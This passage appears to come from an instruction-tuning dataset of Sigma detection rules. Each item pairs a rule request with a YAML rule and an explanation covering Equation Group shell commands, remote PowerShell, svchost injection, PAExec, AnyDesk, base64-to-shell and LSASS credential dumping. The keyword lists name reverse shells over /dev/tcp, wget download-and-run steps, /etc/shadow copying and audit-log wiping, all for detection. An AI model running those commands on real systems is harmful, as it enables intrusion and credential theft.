'chmod 0700 sendmail'\n        - '/usr/bin/wget http*sendmail;chmod +x sendmail;'\n        - '&& telnet * 2>&1 </dev/console'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\ndetection:\n    keywords:\n        # evolvingstrategy, elgingamble, estesfox\n        - 'chown root*chmod 4777 '\n        - 'cp /bin/sh .;chown'\n        # tmpwatch\n        - 'chmod 4777 /tmp/.scsi/dev/bin/gsh'\n        - 'chown root:root /tmp/.scsi/dev/bin/'\n        # estesfox\n        - 'chown root:root x;'\n        # ratload\n        - '/bin/telnet locip locport < /dev/console | /bin/sh'\n        - '/tmp/ratload'\n        # ewok\n        - 'ewok -t '\n        # xspy\n        - 'xspy -display '\n        # elatedmonkey\n        - 'cat > /dev/tcp/127.0.0.1/80 <<END'\n        # ftshell\n        - 'rm -f /current/tmp/ftshell.latest'\n        # ghost\n        - 'ghost_* -v '\n        # morerats client\n        - ' --wipe > /dev/null'\n        # noclient\n        - 'ping -c 2 *; grep * /proc/net/arp >/tmp/gx'\n        - 'iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;'\n        # auditcleaner\n        - '> /var/log/audit/audit.log; rm -f .'\n        - 'cp /var/log/audit/audit.log .tmp'\n        # reverse shell\n        - 'sh >/dev/tcp/* <&1 2>&1'\n        # packrat\n        - 'ncat -vv -l -p * <'\n        - 'nc -vv -l -p * <'\n        # empty bowl\n        - '< /dev/console | uudecode && uncompress'\n        - 'sendmail -osendmail;chmod +x sendmail'\n        # echowrecker\n        - '/usr/bin/wget -O /tmp/a http* && chmod 755 /tmp/cron'\n        # dubmoat\n        - 'chmod 666 /var/run/utmp~'\n        # poptop\n        - 'chmod 700 nscd crond'\n        # abopscript\n        - 'cp /etc/shadow /tmp/.'\n        # ys\n        - '</dev/console |uudecode > /dev/null 2>&1 && uncompress'\n        # jacktelnet\n        - 'chmod 700 jp&&netstat -an|grep'\n        # others\n        - 'uudecode > /dev/null 2>&1 && uncompress -f * && chmod 755'\n        - 'chmod 700 crond'\n        - 'wget http*; chmod +x /tmp/sendmail'\n        - 'chmod 700 fp sendmail pt'\n        - 'chmod 755 /usr/vmsys/bin/pipe'\n        - 'chmod -R 755 /usr/vmsys'\n        - 'chmod 755 $opbin/*tunnel'\n        - 'chmod 700 sendmail'\n        - 'chmod 0700 sendmail'\n        - '/usr/bin/wget http*sendmail;chmod +x sendmail;'\n        - '&& telnet * 2>&1 </dev/console'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious shell commands used in various Equation Group scripts and tools",
      "answer": "In order to detect suspicious shell commands used in various Equation Group scripts and tools, you should: Focus on monitoring Linux systems for specific command patterns that are indicative of malicious activity. These patterns include changing ownership to root and modifying file permissions to make them executable by anyone (e.g., using `chown root*chmod 4777`), copying the shell binary and changing its ownership (`cp /bin/sh .;chown`), modifying permissions and ownership in a temporary directory, especially involving suspiciously named binaries (like `/tmp/.scsi/dev/bin/gsh`), and employing unusual telnet commands to redirect console output to a shell or to set up reverse shells (e.g., `/bin/telnet locip locport < /dev/console | /bin/sh`). Look for the use of tools or scripts named or resembling Equation Group tools, such as `ewok`, `xspy`, `ghost_`, and attempts to wipe or hide network presence (`--wipe > /dev/null`) or manipulate system logs (clearing `/var/log/audit/audit.log`). Monitoring should also include spotting attempts to open backdoors or gain persistent access through modified file permissions on essential utilities or by downloading and executing files with permissions changes (e.g., `wget http*; chmod +x /tmp/sendmail`). It is crucial to watch for these commands in the Linux environment as their execution may indicate an attacker's attempt to establish persistence, escalate privileges, execute arbitrary commands, or exfiltrate data. While some commands might have legitimate uses, their context or combination can signal malicious intent, highlighting the importance of context-aware monitoring to minimize false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session)..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect remote PowerShell sessions by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session), you should monitor Windows process creation logs for entries where the process image or its parent image ends with '\\wsmprovhost.exe'. It's essential to pay attention to the computer name, user, and command line used in the creation of these processes. However, be aware that there may be false positives, such as the legitimate usage of remote PowerShell, for instance, for monitoring purposes. This monitoring has a medium importance level.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wsmprovhost.exe'\n        - ParentImage|endswith: '\\wsmprovhost.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate usage of remote Powershell, e.g. for monitoring purposes.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wsmprovhost.exe'\n        - ParentImage|endswith: '\\wsmprovhost.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate usage of remote Powershell, e.g. for monitoring purposes.\nlevel: medium\n",
      "question": "remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session).",
      "answer": "In order to detect remote PowerShell sessions by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session), you should monitor Windows process creation logs for entries where the process image or its parent image ends with '\\wsmprovhost.exe'. It's essential to pay attention to the computer name, user, and command line used in the creation of these processes. However, be aware that there may be false positives, such as the legitimate usage of remote PowerShell, for instance, for monitoring purposes. This monitoring has a medium importance level."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify abnormal activity where svchost.exe is spawned without any command-line arguments, suggesting a possible malicious process initiation and code injection into the process memory space, you should: Focus on monitoring process creation events within Windows environments. Specifically, look for instances where the command line ends with 'svchost.exe' or the image path ends with '\\svchost.exe', indicating the process in question. It is critical to exclude any events where the parent image path ends with '\\rpcnet.exe' or '\\rpcnetp.exe', as these are associated with Lojack-style software, which represents a known false positive scenario. Additionally, discard events that do not provide any command-line value, as the absence of command-line arguments in conjunction with svchost.exe\u2019s initiation is the primary indicator of suspicious activity. This process targets the identification of techniques used for Persistence, Privilege Escalation, and Defense Evasion by focusing on how adversaries may execute code on a compromised system by injecting into svchost.exe processes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|endswith: 'svchost.exe'\n        Image|endswith: '\\svchost.exe'\n    filter:\n        - ParentImage|endswith:\n            - '\\rpcnet.exe'\n            - '\\rpcnetp.exe'\n        - CommandLine: null  # no CommandLine value available\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Rpcnet.exe / rpcnetp.exe which is a lojack style software. https://www.blackhat.com/docs/us-14/materials/us-14-Kamlyuk-Kamluk-Computrace-Backdoor-Revisited.pdf\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|endswith: 'svchost.exe'\n        Image|endswith: '\\svchost.exe'\n    filter:\n        - ParentImage|endswith:\n            - '\\rpcnet.exe'\n            - '\\rpcnetp.exe'\n        - CommandLine: null  # no CommandLine value available\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Rpcnet.exe / rpcnetp.exe which is a lojack style software. https://www.blackhat.com/docs/us-14/materials/us-14-Kamlyuk-Kamluk-Computrace-Backdoor-Revisited.pdf\nlevel: high\n",
      "question": "It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.",
      "answer": "In order to identify abnormal activity where svchost.exe is spawned without any command-line arguments, suggesting a possible malicious process initiation and code injection into the process memory space, you should: Focus on monitoring process creation events within Windows environments. Specifically, look for instances where the command line ends with 'svchost.exe' or the image path ends with '\\svchost.exe', indicating the process in question. It is critical to exclude any events where the parent image path ends with '\\rpcnet.exe' or '\\rpcnetp.exe', as these are associated with Lojack-style software, which represents a known false positive scenario. Additionally, discard events that do not provide any command-line value, as the absence of command-line arguments in conjunction with svchost.exe\u2019s initiation is the primary indicator of suspicious activity. This process targets the identification of techniques used for Persistence, Privilege Escalation, and Defense Evasion by focusing on how adversaries may execute code on a compromised system by injecting into svchost.exe processes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting See what files are being deleted from flash file systems.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to see what files are being deleted from flash file systems, you should: Monitor Cisco devices that use AAA services for certain activities that indicate files being erased from the flash storage. Specifically, focus on logging activities that involve keywords such as 'erase', 'delete', and 'format'. These actions typically appear in the command set (CmdSet) field within your logs. It's important to note that while detecting these keywords can indicate malicious behavior, there are legitimate scenarios where administrators might use these commands to clean up local flash space. Therefore, these detections are considered to have a medium level of confidence, and further investigation is recommended to differentiate between benign and malicious intentions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: cisco\n    service: aaa\ndetection:\n    keywords:\n        - 'erase'\n        - 'delete'\n        - 'format'\n    condition: keywords\nfields:\n    - CmdSet\nfalsepositives:\n    - Will be used sometimes by admins to clean up local flash space\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: cisco\n    service: aaa\ndetection:\n    keywords:\n        - 'erase'\n        - 'delete'\n        - 'format'\n    condition: keywords\nfields:\n    - CmdSet\nfalsepositives:\n    - Will be used sometimes by admins to clean up local flash space\nlevel: medium\n",
      "question": "See what files are being deleted from flash file systems",
      "answer": "In order to see what files are being deleted from flash file systems, you should: Monitor Cisco devices that use AAA services for certain activities that indicate files being erased from the flash storage. Specifically, focus on logging activities that involve keywords such as 'erase', 'delete', and 'format'. These actions typically appear in the command set (CmdSet) field within your logs. It's important to note that while detecting these keywords can indicate malicious behavior, there are legitimate scenarios where administrators might use these commands to clean up local flash space. Therefore, these detections are considered to have a medium level of confidence, and further investigation is recommended to differentiate between benign and malicious intentions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of renamed version of PAExec. Often used by attackers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of renamed version of PAExec, often used by attackers, you should: Monitor Windows process creation logs for evidence of PAExec application activity. Look for processes described as \"PAExec Application\" or originally filed as \"PAExec.exe\". Additionally, any product containing the term \"PAExec\" should raise suspicions. There are specific import hashes (imphash) listed, namely 11D40A7B7876288F919AB819CC2D9802, 6444f8a34e99b8f7d9647de66aabe516, dfd6aa3f7b2b1035b76b718f1ddc689f, and 1a6cca4d5460b1710a12dea39e4a592c, that are associated with PAExec and should be carefully monitored. Moreover, detection should include checking for these import hashes within the process creation logs.\n\nIt\u2019s important to note, though, that there are legitimate uses of PAExec that might lead to false positives. For example, administrators might rename their PAExec tools, or software companies could bundle PAExec with their software under a different name to avoid embarrassment. Also, when executed with the \"-s\" flag, PAExec copies itself to the \"C:\\Windows\\\" directory but with a different name, following the pattern \"PAExec-[XXXXX]-[ComputerName]\".\n\nThe filtering criteria exclude processes where the image path ends with '\\paexec.exe' or starts with \"C:\\Windows\\PAExec-\u201d to further refine detection and reduce false positives. This focused approach to monitoring, combined with the awareness of potential legitimate use cases, is crucial in identifying malicious use of renamed PAExec tools without overwhelming the system with false alerts. The high level of caution is advised due to the implications of detecting such activity, which is indicative of an attacker\u2019s actions within a network.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: 'PAExec Application'\n        - OriginalFileName: 'PAExec.exe'\n        - Product|contains: 'PAExec'\n        - Imphash:\n            - 11D40A7B7876288F919AB819CC2D9802\n            - 6444f8a34e99b8f7d9647de66aabe516\n            - dfd6aa3f7b2b1035b76b718f1ddc689f\n            - 1a6cca4d5460b1710a12dea39e4a592c\n        - Hashes|contains:\n            - IMPHASH=11D40A7B7876288F919AB819CC2D9802\n            - IMPHASH=6444f8a34e99b8f7d9647de66aabe516\n            - IMPHASH=dfd6aa3f7b2b1035b76b718f1ddc689f\n            - IMPHASH=1a6cca4d5460b1710a12dea39e4a592c\n    filter:\n        - Image|endswith: '\\paexec.exe'\n        - Image|startswith: 'C:\\Windows\\PAExec-'\n    condition: selection and not filter\nfalsepositives:\n    - Weird admins that rename their tools\n    - Software companies that bundle PAExec with their software and rename it, so that it is less embarrassing\n    - When executed with the \"-s\" flag. PAExec will copy itself to the \"C:\\Windows\\\" directory with a different name. Usually like this \"PAExec-[XXXXX]-[ComputerName]\"\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: 'PAExec Application'\n        - OriginalFileName: 'PAExec.exe'\n        - Product|contains: 'PAExec'\n        - Imphash:\n            - 11D40A7B7876288F919AB819CC2D9802\n            - 6444f8a34e99b8f7d9647de66aabe516\n            - dfd6aa3f7b2b1035b76b718f1ddc689f\n            - 1a6cca4d5460b1710a12dea39e4a592c\n        - Hashes|contains:\n            - IMPHASH=11D40A7B7876288F919AB819CC2D9802\n            - IMPHASH=6444f8a34e99b8f7d9647de66aabe516\n            - IMPHASH=dfd6aa3f7b2b1035b76b718f1ddc689f\n            - IMPHASH=1a6cca4d5460b1710a12dea39e4a592c\n    filter:\n        - Image|endswith: '\\paexec.exe'\n        - Image|startswith: 'C:\\Windows\\PAExec-'\n    condition: selection and not filter\nfalsepositives:\n    - Weird admins that rename their tools\n    - Software companies that bundle PAExec with their software and rename it, so that it is less embarrassing\n    - When executed with the \"-s\" flag. PAExec will copy itself to the \"C:\\Windows\\\" directory with a different name. Usually like this \"PAExec-[XXXXX]-[ComputerName]\"\nlevel: high\n",
      "question": "execution of renamed version of PAExec. Often used by attackers",
      "answer": "In order to detect execution of renamed version of PAExec, often used by attackers, you should: Monitor Windows process creation logs for evidence of PAExec application activity. Look for processes described as \"PAExec Application\" or originally filed as \"PAExec.exe\". Additionally, any product containing the term \"PAExec\" should raise suspicions. There are specific import hashes (imphash) listed, namely 11D40A7B7876288F919AB819CC2D9802, 6444f8a34e99b8f7d9647de66aabe516, dfd6aa3f7b2b1035b76b718f1ddc689f, and 1a6cca4d5460b1710a12dea39e4a592c, that are associated with PAExec and should be carefully monitored. Moreover, detection should include checking for these import hashes within the process creation logs.\n\nIt\u2019s important to note, though, that there are legitimate uses of PAExec that might lead to false positives. For example, administrators might rename their PAExec tools, or software companies could bundle PAExec with their software under a different name to avoid embarrassment. Also, when executed with the \"-s\" flag, PAExec copies itself to the \"C:\\Windows\\\" directory but with a different name, following the pattern \"PAExec-[XXXXX]-[ComputerName]\".\n\nThe filtering criteria exclude processes where the image path ends with '\\paexec.exe' or starts with \"C:\\Windows\\PAExec-\u201d to further refine detection and reduce false positives. This focused approach to monitoring, combined with the awareness of potential legitimate use cases, is crucial in identifying malicious use of renamed PAExec tools without overwhelming the system with false alerts. The high level of caution is advised due to the implications of detecting such activity, which is indicative of an attacker\u2019s actions within a network."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting AnyDesk Remote Desktop silent installation. Which can be used by attackers to gain remote access..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect AnyDesk Remote Desktop silent installation, which can be used by attackers to gain remote access, you should: Look for the creation of processes on Windows operating systems where the command line execution includes the specific arguments '--install', '--start-with-win', and '--silent'. These particular arguments indicate an attempt to install the AnyDesk software silently and configure it to start automatically with Windows, potentially without the user's knowledge. This behavior is noteworthy when monitoring for unauthorized remote access tools being deployed on systems. Key information to collect includes the command line that initiated the process, the parent process's command line, and the current directory from which the command was executed. While monitoring for these indicators, consider that legitimate deployments of AnyDesk for authorized remote work scenarios might also use these command-line arguments, representing potential false positives. This detection is significant due to its high level of implication for unauthorized access.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '--install'\n            - '--start-with-win'\n            - '--silent'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - Legitimate deployment of AnyDesk\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '--install'\n            - '--start-with-win'\n            - '--silent'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - Legitimate deployment of AnyDesk\nlevel: high\n",
      "question": "AnyDesk Remote Desktop silent installation. Which can be used by attackers to gain remote access.",
      "answer": "In order to detect AnyDesk Remote Desktop silent installation, which can be used by attackers to gain remote access, you should: Look for the creation of processes on Windows operating systems where the command line execution includes the specific arguments '--install', '--start-with-win', and '--silent'. These particular arguments indicate an attempt to install the AnyDesk software silently and configure it to start automatically with Windows, potentially without the user's knowledge. This behavior is noteworthy when monitoring for unauthorized remote access tools being deployed on systems. Key information to collect includes the command line that initiated the process, the parent process's command line, and the current directory from which the command was executed. While monitoring for these indicators, consider that legitimate deployments of AnyDesk for authorized remote work scenarios might also use these command-line arguments, representing potential false positives. This detection is significant due to its high level of implication for unauthorized access."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious process command line that uses base64 encoded input for execution with a shell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious process command line that uses base64 encoded input for execution with a shell, you should: focus on monitoring process creation events on Linux systems for commands that contain 'base64 ' in their command line. Additionally, watch for commands that pipe input into shell interpreters like bash or sh, specifically those that include '| bash ', '| sh ', '|bash ', and '|sh ' in their command line, as well as those that end with ' |sh', '| bash', '| sh', or '|bash'. It's important to consider all these patterns together to effectively identify this activity. Be mindful that legitimate administration activities may sometimes use similar techniques, so these should be treated as potential false positives. The risk level associated with these detections is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection_base64:\n        CommandLine|contains: 'base64 '\n    selection_exec:\n        - CommandLine|contains:\n            - '| bash '\n            - '| sh '\n            - '|bash '\n            - '|sh '\n        - CommandLine|endswith:\n            - ' |sh'\n            - '| bash'\n            - '| sh'\n            - '|bash'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection_base64:\n        CommandLine|contains: 'base64 '\n    selection_exec:\n        - CommandLine|contains:\n            - '| bash '\n            - '| sh '\n            - '|bash '\n            - '|sh '\n        - CommandLine|endswith:\n            - ' |sh'\n            - '| bash'\n            - '| sh'\n            - '|bash'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n",
      "question": "suspicious process command line that uses base64 encoded input for execution with a shell",
      "answer": "In order to detect suspicious process command line that uses base64 encoded input for execution with a shell, you should: focus on monitoring process creation events on Linux systems for commands that contain 'base64 ' in their command line. Additionally, watch for commands that pipe input into shell interpreters like bash or sh, specifically those that include '| bash ', '| sh ', '|bash ', and '|sh ' in their command line, as well as those that end with ' |sh', '| bash', '| sh', or '|bash'. It's important to consider all these patterns together to effectively identify this activity. Be mindful that legitimate administration activities may sometimes use similar techniques, so these should be treated as potential false positives. The risk level associated with these detections is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious user agent string of APT40 Dropbox tool.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious user agent string of APT40 Dropbox tool, you should focus on monitoring proxy logs for specific user-agent strings and hostnames associated with this activity. Look for HTTP requests coming from the user agent \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36\" that are making connections to the hostname 'api.dropbox.com'. These specific indicators can be a sign of malicious activities as they mimic legitimate traffic to Dropbox, potentially indicative of an advanced persistent threat (APT) group leveraging Dropbox as part of their command and control infrastructure. \n\nImportant data to log and analyze in this context includes the client's IP address (`c-ip`) and the requested URI (`c-uri`) to further investigate the traffic patterns and potentially malicious requests. However, it's crucial to note that false positives may arise from old browsers with similar user agent strings genuinely accessing Dropbox. Hence, the detection level is considered high due to the specificity of these indicators to targeted attack scenarios, particularly those associated with the APT40 group. By paying close attention to these attributes within proxy logs, organizations can identify and investigate potentially malicious use of cloud services, which is a technique outlined under command and control tactics in cyber security frameworks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        c-useragent: 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36'\n        cs-host: 'api.dropbox.com'\n    condition: selection\nfields:\n    - c-ip\n    - c-uri\nfalsepositives:\n    - Old browsers\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        c-useragent: 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36'\n        cs-host: 'api.dropbox.com'\n    condition: selection\nfields:\n    - c-ip\n    - c-uri\nfalsepositives:\n    - Old browsers\nlevel: high\n",
      "question": "suspicious user agent string of APT40 Dropbox tool",
      "answer": "In order to detect suspicious user agent string of APT40 Dropbox tool, you should focus on monitoring proxy logs for specific user-agent strings and hostnames associated with this activity. Look for HTTP requests coming from the user agent \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36\" that are making connections to the hostname 'api.dropbox.com'. These specific indicators can be a sign of malicious activities as they mimic legitimate traffic to Dropbox, potentially indicative of an advanced persistent threat (APT) group leveraging Dropbox as part of their command and control infrastructure. \n\nImportant data to log and analyze in this context includes the client's IP address (`c-ip`) and the requested URI (`c-uri`) to further investigate the traffic patterns and potentially malicious requests. However, it's crucial to note that false positives may arise from old browsers with similar user agent strings genuinely accessing Dropbox. Hence, the detection level is considered high due to the specificity of these indicators to targeted attack scenarios, particularly those associated with the APT40 group. By paying close attention to these attributes within proxy logs, organizations can identify and investigate potentially malicious use of cloud services, which is a technique outlined under command and control tactics in cyber security frameworks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting processes requesting access to LSASS memory via suspicious access masks. This is typical for credentials dumping tools.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect processes requesting access to LSASS memory via suspicious access masks, which is typical for credentials dumping tools, you should: Monitor Windows processes for any attempts to access the LSASS.exe (Local Security Authority Subsystem Service) executable with specific access permissions that are unusual and indicative of malicious intent. Specifically, look out for processes that end with attempting to interact with LSASS.exe using access rights like '0x40', '0x100000', '0x1410', '0x1438', '0x143a', '0x1418', '0x1f0fff', '0x1f1fff', '0x1f2fff', and '0x1f3fff'. These access rights reflect different levels of permission requests, which in the context of LSASS.exe, are often related to credential dumping or other unauthorized information gathering actions.\n\nExclude legitimate system and monitoring tools that might require access to LSASS for non-malicious purposes. This includes filtering out processes like task manager, performance monitor, certain Windows Defender processes, VMware tools, and several others known to legitimately access LSASS.exe for system management or security purposes. Also, consider exclusions for processes related to gaming services, Microsoft Edge installer, WebEx host, Malwarebytes update, Dropbox update, and the MSBuild process as these might legitimately request access to LSASS but are unlikely to be used for credentials dumping.\n\nPay attention to potential false positives, as legitimate software might occasionally need to access LSASS in a manner similar to credential dumping tools, thus requiring a high level of scrutiny and potentially leading to a likely chance of false-positive detections.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|startswith:\n            - '0x40'\n            # - '0x1000'  # minimum access requirements to query basic info from service\n            # - '0x1400'\n            - '0x100000'\n            - '0x1410'    # car.2019-04-004\n            # - '0x1010'    # car.2019-04-004\n            - '0x1438'    # car.2019-04-004\n            - '0x143a'    # car.2019-04-004\n            - '0x1418'    # car.2019-04-004\n            - '0x1f0fff'\n            - '0x1f1fff'\n            - '0x1f2fff'\n            - '0x1f3fff'\n    filter_exact:\n        SourceImage:\n            - 'C:\\WINDOWS\\system32\\taskmgr.exe'\n            - 'C:\\Windows\\System32\\perfmon.exe'\n    filter_generic:\n        SourceImage|startswith:\n            - 'C:\\Program Files\\'\n            - 'C:\\Program Files (x86)\\'\n        GrantedAccess:\n            - '0x1410'\n            - '0x410'\n    filter_defender:\n        SourceImage|startswith:\n            - 'C:\\ProgramData\\Microsoft\\Windows Defender\\'\n            - 'C:\\Program Files\\Windows Defender\\'\n            - 'C:\\Program Files\\Microsoft Security Client\\MsMpEng.exe' # Windows7\n        SourceImage|endswith: '\\MsMpEng.exe'\n    filter_defender_updates:\n        SourceImage: 'C:\\Windows\\System32\\svchost.exe'\n        CallTrace|contains|all:\n            - '|C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{'\n            - '}\\mpengine.dll+'\n        GrantedAccess: '0x1418'\n    filter_defender_calltrace:\n        CallTrace|contains:\n            - '|c:\\program files\\windows defender\\mprtp.dll'\n            - '|c:\\program files\\windows defender\\MpClient.dll'\n    filter_gaming_services:\n        SourceImage|startswith: 'C:\\Program Files\\WindowsApps\\'\n        SourceImage|endswith: '\\GamingServices.exe'\n        GrantedAccess:\n            - '0x1410'\n            - '0x410'\n    filter_specific_granted_access_1:\n        SourceImage|endswith:\n            - '\\PROCEXP64.EXE'\n            - '\\PROCEXP.EXE'\n            - 'C:\\WINDOWS\\system32\\taskhostw.exe'\n            - '\\MBAMInstallerService.exe'\n        GrantedAccess:\n            - '0x1410'\n            - '0x410'\n            - '0x40'\n    filter_specific_granted_access_2:\n        SourceImage:\n            - 'C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe'\n            - 'C:\\Windows\\syswow64\\MsiExec.exe'\n            - 'C:\\Windows\\System32\\msiexec.exe'\n        GrantedAccess:\n            - '0x1410'\n            - '0x410'\n            - '0x1f1fff'\n            - '0x1f3fff'\n    filter_specific_granted_access_3:\n        SourceImage:\n            - 'C:\\Windows\\system32\\wininit.exe'\n            - 'C:\\Windows\\System32\\lsass.exe'\n        GrantedAccess: '0x1000000'\n    filter_vmwaretools:\n        SourceImage|startswith: 'C:\\ProgramData\\VMware\\VMware Tools\\'\n        SourceImage|endswith: '\\vmtoolsd.exe'\n    filter_svchost:\n        SourceImage: 'C:\\WINDOWS\\system32\\svchost.exe'\n        GrantedAccess:\n            - '0x100000'\n            - '0x1410'\n    filter_nextron:\n        SourceImage|endswith:\n            - '\\thor.exe'\n            - '\\thor64.exe'\n            - '\\aurora-agent.exe'\n            - '\\aurora-agent-64.exe'\n        GrantedAccess:\n            - '0x40'\n            - '0x1010'\n    filter_explorer:\n        SourceImage|endswith: '\\explorer.exe'\n        GrantedAccess: '0x401'\n    filter_mrt:\n        SourceImage: 'C:\\Windows\\system32\\MRT.exe' # Windows Malicious Software Removal Tool\n        GrantedAccess:\n            - '0x1410'\n            - '0x1418'\n    filter_handle:\n        GrantedAccess: '0x40'\n        SourceImage|endswith:\n            - '\\handle.exe'\n            - '\\handle64.exe'\n    filter_edge: # version in path 96.0.1054.43\n        SourceImage|startswith: 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\'\n        SourceImage|endswith: '\\Installer\\setup.exe'\n    filter_webex:\n        SourceImage|endswith: '\\AppData\\Local\\WebEx\\WebexHost.exe'\n        GrantedAccess: '0x401'\n    filter_malwarebytes:\n        SourceImage: 'C:\\PROGRAMDATA\\MALWAREBYTES\\MBAMSERVICE\\ctlrupdate\\mbupdatr.exe'\n        GrantedAccess: '0x1410'\n    filter_dropbox:\n        SourceImage|contains:\n            - ':\\Windows\\Temp\\'\n            - '\\AppData\\Local\\Temp\\'\n        SourceImage|endswith: '.tmp\\DropboxUpdate.exe'\n        GrantedAccess:\n            - '0x410'\n            - '0x1410'\n    filter_msbuild:\n        # This FP was generated while building CPython from source and could be related to other similar examples.\n        # But if you don't do that kind of stuff consider removing it from the rule ;)\n        SourceImage|startswith: 'C:\\Program Files\\Microsoft Visual Studio\\'\n        SourceImage|endswith: '\\MSBuild\\Current\\Bin\\MSBuild.exe'\n        GrantedAccess: '0x1F3FFF'\n    # Old - too broad filter\n        # SourceImage|endswith: # easy to bypass. need to implement supportive rule to detect bypass attempts\n        #     - '\\wmiprvse.exe'\n        #     - '\\taskmgr.exe'\n        #     - '\\procexp64.exe'\n        #     - '\\procexp.exe'\n        #     - '\\lsm.exe'\n        #     - '\\MsMpEng.exe'\n        #     - '\\csrss.exe'\n        #     - '\\wininit.exe'\n        #     - '\\vmtoolsd.exe'\n    filter_games:\n        SourceImage|contains: '\\SteamLibrary\\steamapps\\'\n    condition: selection and not 1 of 